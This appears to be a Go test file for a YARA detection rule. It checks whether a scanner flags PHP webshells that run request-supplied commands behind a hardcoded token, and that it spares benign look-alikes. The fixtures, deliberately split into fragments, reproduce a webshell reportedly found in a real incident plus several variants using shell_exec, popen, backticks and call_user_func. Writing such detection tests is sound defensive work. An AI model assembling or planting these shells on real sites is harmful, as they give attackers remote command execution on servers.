//go:build yara

package yara

import "testing"

// Deep-scan counterpart of the realtime webshell_token_gate_indirect rule. The
// realtime rule only fires on write, so a shell already resting on disk (the
// 2026-07-20 filmetaricom case) is only reachable through the scheduled scan.
// Fixtures are assembled from fragments so this source carries no complete
// webshell signature.
func TestWebshellTokenGateIndirect_Yara(t *testing.T) {
	s := loadRepoYaraScanner(t)

	realShell := "<?php\n$token = '9129ed4863864b21448183d53e8dbd05';\n" +
		"$input_token = isset(" + gGet + "['t']) ? (string)" + gGet + "['t'] : '';\n\n" +
		"if ($token === $input_token && isset(" + gGet + "['c'])) {\n" +
		"    $cmd = (string)" + gGet + "['c'];\n" +
		"    $output = '';\n" +
		"    // Try multiple execution methods\n" +
		"    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', @ini_get('disable_functions')))) {\n" +
		"        $output = @shell_" + "exec($cmd . ' 2>&1');\n" +
		"    }\n}"
	if !hasYaraRule(s.ScanBytes([]byte(realShell)), "webshell_token_gate_indirect") {
		t.Error("webshell_token_gate_indirect: real token shell not detected by deep scan")
	}

	variants := []struct{ name, content string }{
		{
			"reversed declaration order",
			"<?php $in = " + gGet + "['k']; $tok = 'mm44nn55bb66'; if ($in === $tok) { $cmd = " + gGet + "['c']; " + sSys + "($cmd); }",
		},
		{
			"loose comparison",
			"<?php $k = 'a1b2c3d4e5f6'; $t = " + gPost + "['t']; if ($t == $k) { $c = " + gPost + "['c']; " + sSys + "($c); }",
		},
		{
			"popen sink",
			"<?php $tok = 'qqww11ee22rr'; $in = " + gGet + "['k']; if ($tok === $in) { $cmd = " + gGet + "['c']; $fp = @popen($cmd, 'r'); }",
		},
		{
			"double-quoted token, comments, and cast",
			"<?php $secret/*a*/=/*b*/\"zx98yw76vu54\"; $given = " + gReq + "[\"auth\"]; if ($given === $secret) { $c = " + gReq + "['cmd']; @" + sPass + "((string)$c); }",
		},
		{
			"hash_equals with call_user_func sink",
			"<?php $tok = 'hh44jj55kk66'; $in = " + gPost + "['k']; if (hash_equals($tok, $in)) { $cmd = " + gPost + "['c']; call_user_func('" + sSys + "', $cmd); }",
		},
		{
			"strcmp with backtick sink",
			"<?php $tok = 'ss44tt55uu66'; $in = " + gGet + "['k']; if (strcmp($in, $tok) === 0) { $cmd = " + gGet + "['c']; $out = `$cmd`; }",
		},
	}
	for _, v := range variants {
		if !hasYaraRule(s.ScanBytes([]byte(v.content)), "webshell_token_gate_indirect") {
			t.Errorf("webshell_token_gate_indirect missed %s", v.name)
		}
	}

	benign := []struct{ name, content string }{
		{"nonce via variable", "<?php $expected = wp_create_nonce('act'); $sent = " + gPost + "['_wpnonce']; if ($sent === $expected) { do_thing(); }"},
		{"license gate without sink", "<?php $license = 'prolicense2026'; $given = " + gPost + "['license']; if ($given == $license) { enable_pro(); }"},
		{"object method sink", "<?php $key = 'a1b2c3d4e5'; $in = " + gPost + "['key']; if ($in === $key) { $runner->" + "exec($task); }"},
		{"no request source", "<?php $expected = 'buildhash1234'; $actual = $manifest['hash']; if ($actual === $expected) { " + sSys + "($deployCmd); }"},
		{"unrelated sink after closed gate", "<?php $channel = 'production'; $action = " + gReq + "['action']; if ($current === $expected) { dispatch($action); } " + sSys + "($maintenanceCmd);"},
		{"unrelated capability command inside gate", "<?php $channel = 'production'; $action = " + gReq + "['action']; if ($installed === $required) { " + sSys + "($healthCheck); dispatch($action); }"},
		{"hash_equals wrapper", "<?php $secret = 'aa11bb22cc33'; $in = " + gGet + "['k']; if (my_hash_equals($secret, $in)) { $cmd = " + gGet + "['c']; " + sSys + "($cmd); }"},
	}
	for _, b := range benign {
		if hasYaraRule(s.ScanBytes([]byte(b.content)), "webshell_token_gate_indirect") {
			t.Errorf("webshell_token_gate_indirect FP on %s", b.name)
		}
	}
}
